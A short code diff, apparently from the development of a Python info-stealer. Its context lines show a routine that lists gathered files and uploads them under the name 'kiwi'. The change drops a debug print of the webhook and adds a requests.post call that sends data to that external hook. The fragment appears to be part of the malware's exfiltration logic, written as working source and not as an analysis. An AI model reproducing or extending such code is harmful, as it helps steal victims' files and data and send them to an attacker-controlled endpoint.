@@ -893,8 +893,11 @@ if not DETECTED:
                 filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
             filetext += "\n"
     upload("kiwi", filetext)
-    
-   # I will delete that later its for dev !! 
-print(hook)
+Message = {
+    "content": "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
+}
+requests.post(hook, data=Message)
 
-time.sleep(99999)
+#for ---------------------------------
+    
+
